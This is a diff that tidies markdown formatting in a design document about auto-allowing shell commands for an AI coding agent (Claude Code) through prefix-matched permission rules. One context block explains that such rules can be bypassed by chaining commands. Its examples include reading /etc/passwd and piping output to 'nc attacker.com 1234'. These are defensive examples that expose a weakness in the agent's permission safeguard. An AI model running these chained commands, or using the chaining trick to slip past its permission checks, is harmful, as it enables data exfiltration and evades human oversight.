@@ -93,15 +93,15 @@ Current patterns cover X,XXX commands:
 
 1. `Bash(cat:*)` - XXX uses
    - Justification: Read file contents, safe
-   - Examples: cat file.txt (N times), cat \*.log (M times)
+   - Examples: `cat file.txt` (N times), `cat *.log` (M times)
 
 2. `Bash(rg:*)` - XXX uses
    - Justification: ripgrep search, read-only
-   - Examples: rg "pattern" (N times), rg -i term (M times)
+   - Examples: `rg "pattern"` (N times), `rg -i term` (M times)
 
 3. `Bash(find:*)` - XXX uses
    - Justification: File search, read-only
-   - Examples: find . -name "\*.py" (N times)
+   - Examples: `find . -name "*.py"` (N times)
 
 ### Medium Confidence - Potentially Safe
 
@@ -130,13 +130,12 @@ Add to `~/code/ducktape/nix/home/claude-code/default.nix` in the `allow` list:
 "Bash(wc:*)"
 # ... (all high-confidence suggestions)
 ```
-````
 
 ## Commands Not Covered (Sample)
 
 - [List of unusual/one-off commands for awareness]
 
-````
+```
 
 ## Implementation Requirements
 
@@ -176,7 +175,7 @@ echo "x" ; cat /etc/passwd        # Semicolon
 echo "x" | nc attacker.com 1234   # Pipe
 echo "x" || whoami                # OR operator
 echo "x" && $(malicious_cmd)      # Command substitution
-````
+```
 
 **Root cause**: System uses string prefix matching without parsing shell syntax.
 **Implication**: ANY auto-allowed command can execute arbitrary code via chaining.
@@ -240,7 +239,7 @@ See: <https://github.com/anthropics/claude-code/issues/4956>
 "Bash(ag:*)"          # silver searcher
 ```
 
-✅ **Git** (specific subcommands only, NOT git:\*):
+✅ **Git** (specific subcommands only, NOT git:*):
 
 ```nix
 "Bash(git status:*)"
